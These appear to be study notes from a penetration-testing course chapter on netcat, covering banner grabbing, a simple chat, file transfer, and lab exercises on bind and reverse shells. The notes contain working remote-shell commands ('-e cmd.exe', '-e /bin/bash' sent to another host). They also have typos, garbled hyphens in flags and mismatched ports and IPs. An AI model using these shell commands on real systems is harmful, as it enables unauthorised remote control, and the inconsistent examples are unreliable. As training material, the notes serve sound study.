# 2. - The Essential Tools

##### p.36

## Table fo contents

#### [2.1 - Netcat](#21---netcat-1)

## 2.1 - Netcat

[Netcat](https://en.wikipedia.org/wiki/Netcat) is a tool that can read and write to TCP and UDP ports.
The Hacker's Swiss Army Knife and exists as both Linux and Windows binaries.

### 2.1.1 - Connecting to a TCP/UDP Port

Connecting to a TCP/UDP port can be useful in several situations:

* To check if a port is open or closed
* To read a banner from the port
* To connect to a network service manually

Let's begin by using **netcat** to check if TCP port 110 (POP3 mail service) is open in [metasploitable](https://sourceforge.net/projects/metasploitable/) virtual machine.

```
root@kali:~# nc 192.168.0.104 110
(UNKNOWN) [10.0.0.22] 110 (pop3) open
+OK POP3 server lab ready <00003.1277944@lab>
```

The output aboce tells us several things. First, the TCP connection to IP 192.168.0.104 on port 110 succeeded, and **netcat** found the remote port open. Next, we can see that the server responded to our connection by "talking back to us" and spitting out the server welcome message, prompting us to log in, wich is standard for POP3 services.

### 2.1.2 Listening on a TCP/UDP Port

Listening on a TCP/UDP port using **netcat** is useful for network debugging client applications. Let's try implementing a simple chat involving two machines, using **netcat** both as a client and server.

Set up **netcat** to listen for **incomming connections** on TCP port 4444 on a Ubuntu machine (server):

```
root@ubuntu:~$ nc -vnlp 4444
Listening on [0.0.0.0] (family 0, port 5859)
```

Once we have bound port 4444 on the Windows machine Netcat, we can connect to that port from the Kali Linux machine to interact with it.

```
root@kali:~# nc -nv 10.0.2.2 4444
(UNKNOWN) [10.0.2.2] 5859 (?) open
This chat is from Kali Linux vm
```

Our text is sent to the Windows machine over TCP port 4444 and we can continue the *"chat"* from the Ubuntu machine (IP 10.0.2.2).

```
root@ubuntu:~$ nc -vnlp 5859
Listening on [0.0.0.0] (family 0, port 5859)
Connection from [127.0.0.1] port 5859 [tcp/*] accepted (family 2, sport 58668)
This chat is from Kali Linux machine
This chat is from Ubuntu machine
```

### Exercicies

1. Wich machine acted as the **netcat server**?

> Ubuntu

2. Wich machine acted as the **netcat client**?

> Kali Linux

3. On which machine was port 4444 actually opened?

> Ubuntu

4. The command line syntax difference between the client and serve.

* Server
```
root@ubuntu:~$ nc -vnlp 4444
```

* Client
```
root@kali:~# nc -nv 10.0.2.2 4444
```

### 2.1.3 Transferring Files with Netcat

Netcat can also be used to transfer files, both text and binary, from one computer to another. To send a file from the Kali Linux to the Ubuntu machine, we initiate a setup that is similar to the precious chat example.

On the **Ubuntu** machine, we will set up a **netcat** listener on port 4444 and redirect any incoming input into a file called *incoming.exe*

```
root@ubuntu:~$ nc -vnlp 4444 > incoming.exe
```

On the **Kali Linux** syste,, we will push the *wget.exe* file to the Ubuntu machine through TCP port 4444

```
root@kali:~# locate wget.exe
/usr/share/windows-binaries/wget.exe
root@kali:~# nc -vn 10.0.2.2 4444 < /usr/share/windows-binaries/wget.exe
```

The connection is received by **netcat** on the Ubuntu machine as shown bellow:

```
nc -vnlp 4444 > incoming.exe
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46084)
```

Notice that we haven't received any feddback from **netcat** about our file upload progress. We can just wait for a moment and check wheter it has been fully upload to the Ubuntu machone (check file size).

### 2.1.4 Remote Administration with Netcat

One of the most useful features of netcat is its ability to do command redirection. Netcat can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console. To further explain this, consider the cmd.exe executable. By redirecting the stdin, stdout, and stderrto the network, you can bind cmd.exe to a local port. Anyone connecting to this port will be resented with a command prompt belonging to this computer.

```
```

#### 2.1.4.1 - Netcat Bind Shell Scenario
I our first scenario, Bob (running Windows) has requested Alice's assistence (running Linux) and has asked her to connect to his computer and issue some commands remotely. bob has a public IP address, and is directly connected to the Internet. Alice, however, is behind a NATd connection, and has an internal IP address. To complete the scenario, Bob needs to bind **cmd.exe** to a TCP port in his public IP address, and ask Alice to connect to this particular IP and port. Bob will procees to issue the following command with **netcat**

```
C:\Users\offsec> nc ­‐nlvp 4444 ­‐e cmd.exe
listening on [any] 4444...
```

Netcat has bound TCP port 4444 to **cmd.exe** and will redirect any input, output, or error messages from **cmd.exe** to the network. In other words, anyone connecting to TCP port 4444 on Bob's machine, hopeffully Alice, will be presented with Bob's command prompt.

```
root@kali:~# ifconfig eth0 | grep inet
		inet addr:10.0.0.4 cast:10.0.0.255 Mask:255.255.255.0

root@kali:~# nc -­nv 10.0.0.22 4444
(UNKNOWN) [10.0.0.22] 4444 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig 
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix  . :
IPv4 Address. . . . . . . . . . . : 10.0.0.22
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.0.0.138

C:\Users\offsec>
```

#### 2.1.4.2 - Reverse Shell Scenario

Reverse Shell Scenario In our second scenario, Alice needs help from Bob.
However, Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her  internal machine. Is there any way for Bob to connect to Alice'ʹs computer, and solve her problem? Here we discover another useful feature of
Netcat, the ability to send a command shell to a listening host. In this situation, although Alice cannot bind a port to /bin/bash
locally on her computer and expect Bob to connect, she can send control of her command prompt to Bob'ʹs machine, instead.
This is known as a reverse shell.
To get this working, Bob needs to set up netcat to listen for an incoming shell.
We’ll use port 4444 in our example:

```
C:\Users\offsec> nc ­‐nlvp 4444 
listening on [any] 4444 ...
```

Now Alice can send a reverse shell from her Linux Machine to Bob:

```
root@kali:~# nc ­‐nv 10.0.0.22 4444 ­‐e /bin/bash
(UNKNOWN)    [10.0.0.22]    4444    (?)    open
```

### 2.1.5 Exercises

1. Implement a simple chat between you Kali and Windows system

> Ubuntu (Server)

```
nc -vnlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

> Kali Linux (Client)

```
nc -vn 10.0.2.2 4444
(UNKNOWN) [10.0.2.2] 4444 (?) open
```

2. Practice using Netcat to create the following:
	* Reverse shell from Kali to Windows
	* Reverse shell from Windows to Kali
	* Bind shell on Kali. use your Windows client to connect to it
	* Bind shell in Windows. Use your kali system to connec to it